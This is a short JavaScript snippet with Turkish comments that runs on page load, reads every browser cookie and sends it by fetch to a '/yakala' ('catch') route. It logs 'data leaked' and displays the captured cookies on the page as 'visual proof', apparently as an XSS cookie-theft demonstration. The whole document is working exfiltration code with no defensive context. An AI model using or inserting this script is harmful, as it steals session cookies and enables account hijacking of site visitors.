// Sayfa yüklendiğinde çalış
window.onload = function() {
    // 1. Çerezleri oku
    var tumCerezler = document.cookie;

    // 2. Eğer çerez varsa sunucuya gönder
    if (tumCerezler) {
        // Fetch ile arka planda /yakala rotasına gönderiyoruz
        fetch('/yakala?data=' + encodeURIComponent(tumCerezler))
        .then(response => {
            console.log("Veri sızdırıldı...");
        })
        .catch(err => {
            console.log("Bağlantı hatası.");
        });
    }

    // Ekranda bir şeyler gösterelim (Görsel kanıt için)
    document.getElementById('display').innerText = "Yakalanan: " + (tumCerezler || "Boş!");
};
